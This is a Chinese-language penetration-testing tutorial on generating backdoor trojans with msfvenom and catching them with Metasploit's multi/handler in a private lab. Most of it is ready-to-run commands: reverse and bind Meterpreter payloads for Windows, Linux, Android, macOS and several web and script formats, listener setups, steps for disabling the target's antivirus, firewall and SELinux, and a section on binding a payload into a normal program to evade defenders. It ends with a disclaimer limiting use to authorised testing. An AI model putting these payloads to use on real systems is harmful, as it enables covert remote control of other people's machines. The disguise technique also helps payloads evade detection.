---
title: Msfvenom 生成后门木马实战
short_title: Msfvenom 后门木马
date: 2024-11-08 20:44:27
description: 使用 Msfvenom 生成 Windows/Linux 平台的反弹与正向木马，配合 multi/handler 上线 Meterpreter，并记录程序捆绑与伪装方法。
tag:
  - Metasploit
  - Msfvenom
  - 后门木马
category:
  - 渗透测试
timeline: true
isOriginal: true
index: true
order: 7
---

## 实验环境

| 角色 | 系统 | IP |
| --- | --- | --- |
| 攻击机 | Kali Linux | 192.168.100.132 |
| 靶机 | Windows 10 | 192.168.100.150 |
| 靶机 | CentOS 6.5 | 192.168.100.163 |

## 环境准备

实验前需要关闭靶机防火墙，让木马能够正常回连。

Windows 下关闭安全中心的实时保护：

![image](./assets/csdn-2e14525d.png)

![image](./assets/csdn-19c6d661.png)

![image](./assets/csdn-31c5a830.png)

![image](./assets/csdn-908bb139.png)

再关闭 Windows 防火墙：

![image](./assets/csdn-5a2c569a.png)

![image](./assets/network-asset-0b74561fb3d4515a0697068e751f9a67-20241108204427-8ym0l6c.png)

![image](./assets/network-asset-e107b84c36799461c66c84738130f2f9-20241108204427-lyit8l6.png)

![image](./assets/network-asset-6deea570adaee909bbe3e9932e4d0bb3-20241108204427-0vpru5j.png)

![image](./assets/network-asset-9b9ee6a4bbcdf674478ec87687da3100-20241108204428-uq74250.png)

Linux 下关闭 iptables 和 SELinux：

```bash
service iptables stop
setenforce 0
```

![image](./assets/network-asset-714506fb86ba1c3de6e085a6f86e90a3-20241108204428-c7qr8uu.png)

## Msfvenom 简介

`msfvenom` 是 `msfpayload` 和 `msfencode` 的结合体，可以生成木马程序，在目标机器上执行后配合 `meterpreter` 上线。

在 Kali 中使用 `msfvenom -h` 查看参数：

```bash
msfvenom -h
```

```text
用法：/usr/bin/msfvenom [options] <var=val>
示例：/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
```

常用参数：

```text
-p, --payload <payload>   指定 payload
-f, --format <format>     输出格式，如 exe、elf、raw、asp、aspx
-e, --encoder <encoder>   指定编码器，如 x86/shikata_ga_nai
-i, --iterations <count>  编码次数
-b, --bad-chars <list>    避免出现的字符，如 '\x00\xff'
-a, --arch <arch>         指定架构，如 x86、x64
-o, --out <path>          输出文件
-x, --template <path>     指定捆绑的模板程序
-k, --keep                保留模板行为，把 payload 作为新线程注入
LHOST / LPORT             回连地址和端口
```

![image](./assets/network-asset-6d9f34e5eaa5b8b38b81f50f6946e0d7-20241108204428-2i6xjpw.png)

## 正向与反向

Msfvenom 生成的 payload 分为正向和反向两种：

- **正向连接（bind）**：目标机器打开一个端口，攻击机主动连接目标端口；
- **反向连接（reverse）**：攻击机监听端口，目标机器主动回连攻击机。

反向连接更常用，也更稳定；目标处于深层网络、无法主动出网时，才考虑正向连接。

## 各平台生成命令

```bash
# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -o ~/Desktop/test2.apk

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f elf > shell.elf

# macOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f macho > shell.macho

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=4444 -f raw -o test.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f asp > shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f aspx > shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f raw > shell.jsp

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.10.27 LPORT=8888 -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.10.27 LPORT=8888 -f raw > shell.pl

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -f raw > shell.py
```

## 反向木马

拿到 WebShell 或通过社会工程学让目标运行木马后，目标会主动把 shell 反弹到攻击机。

### Windows 平台

先在 Kali 上启动监听：

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.100.132
set lport 6666
exploit
```

![image](./assets/network-asset-2c1bfb671011cae015e33d096b2abd0c-20241108204428-10isvzi.png)

![image](./assets/network-asset-4dcd08214acbe0ecad04a50104f3c958-20241108204428-x4uuelu.png)

生成反弹木马：

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.132 lport=6666 -f exe -o test.exe
```

![image](./assets/network-asset-cf161511a756fd4f40bd033e75f66599-20241108204428-phxgw9o.png)

把 `test.exe` 放到目标主机并运行：

![image](./assets/network-asset-a0c0761182b0846366b9cceb044af51e-20241108204429-l984gnd.png)

成功上线 Meterpreter：

![image](./assets/network-asset-2f065f58a80d601d64e5bcc092cb75d0-20241108204429-umylz5p.png)

![image](./assets/network-asset-bec106cef382222eb0c1ee7c6b8ec0eb-20241108204429-v2ix77e.png)

### 捆绑程序伪装

攻防演练中，蓝队会排查不明程序，直接运行木马很容易被发现。可以把木马捆绑到正常程序上，运行时功能正常，隐蔽性更好。

先启动监听：

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.100.132
set lport 6666
exploit
```

![image](./assets/network-asset-3cd943917c2c59df2d0ee05c447fa495-20241108204429-bippdgn.png)

![image](./assets/network-asset-4dcd08214acbe0ecad04a50104f3c958-20241108204429-r6kefoo.png)

生成捆绑木马：

```bash
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.132 lport=6666 -f exe -o test_win10.exe
```

![image](./assets/csdn-92e8e183.png)

![image](./assets/image-20241108204725-cikn6s1.png)

把木马放到目标主机运行，可以看到弹出的是正常的 cmd 窗口：

![image](./assets/csdn-e88db9d1.png)

成功上线：

![image](./assets/network-asset-4dcd08214acbe0ecad04a50104f3c958-20241108204430-gjn0le1.png)

![image](./assets/network-asset-023f5a093e4e43d269d679b6198af9db-20241108204430-rzom4n9.png)

![image](./assets/network-asset-bec106cef382222eb0c1ee7c6b8ec0eb-20241108204430-gcqioes.png)

### Linux 平台

启动监听：

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.100.132
set lport 6666
exploit
```

![image](./assets/network-asset-f3481c95772693935e372f8bfb692ed2-20241108204430-4ajuusr.png)

生成木马：

```bash
# 32 位
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.132 LPORT=6666 -f elf > test.elf
# 64 位
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.132 LPORT=6666 -f elf > test.elf
```

![image](./assets/network-asset-2a54a12fab2c87b592cc4ebfec67d30a-20241108204430-q1la8a1.png)

把木马放到目标主机，默认没有可执行权限：

```bash
ls -l
```

![image](./assets/network-asset-6c6cb5e56ccefff809ef289e92ac6bf9-20241108204430-t00vnwd.png)

赋予执行权限：

```bash
chmod +x test1.elf
```

![image](./assets/network-asset-f5906842700c02b2b4b91f03f4c71931-20241108204431-em22dti.png)

执行木马：

![image](./assets/network-asset-980e5de89375f74ec0fe82a52e52f9ea-20241108204431-lah65aj.png)

成功反弹 shell：

![image](./assets/network-asset-b0d6f5b3c9156c16e4c199cddac28bed-20241108204431-lo08hgd.png)

## 正向木马

### Windows 平台

生成正向木马：

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp lhost=192.168.100.132 lport=6666 -f exe -o test2.exe
```

![image](./assets/network-asset-90f03ed907a44b70cb05eff8ac3e0e75-20241108204431-g1olk35.png)

把木马放到目标服务器并运行：

![image](./assets/network-asset-4bedbb141542202f0d345c6104de980b-20241108204431-dgt4rkv.png)

使用 `multi/handler` 主动连接目标：

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 192.168.100.150
set lport 6666
exploit
```

![image](./assets/network-asset-4eeb1dbfeda07204e1f7f49e57168587-20241108204431-hwpr1hl.png)

### Linux 平台

生成正向木马：

```bash
msfvenom -p linux/x86/meterpreter/bind_tcp lhost=192.168.100.132 lport=6666 -f elf > test2.elf
```

![image](./assets/network-asset-39781bc544df0f2b6e4eff29423e7dd7-20241108204432-gin1eb1.png)

把木马放到目标主机，同样先检查权限：

```bash
ls -l
```

![image](./assets/network-asset-a7ec391629a057da722e69c40fa57c96-20241108204432-nn332h7.png)

赋予执行权限并运行：

```bash
chmod +x test2.elf
```

![image](./assets/network-asset-107d3c616ca3e1b9bb00f40f18d4d9d6-20241108204432-3qyl7e6.png)

![image](./assets/network-asset-96ab1e05fb13fe297ddefe00714a6b2f-20241108204432-a1127pe.png)

连接目标：

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/bind_tcp
set rhost 192.168.100.163
set lport 6666
exploit
```

![image](./assets/network-asset-b7c7edf263b88300996e9880f5ad1d9a-20241108204432-3cmv7or.png)

## 总结

反向木马配置简单、成功率高，是首选方式；正向木马适合目标无法主动出网的场景。捆绑正常程序可以降低被发现概率，但也要求对目标环境和常用软件有足够了解。

::: warning 声明
本文仅用于授权的安全测试与教学环境，请勿对未授权目标进行测试。
:::
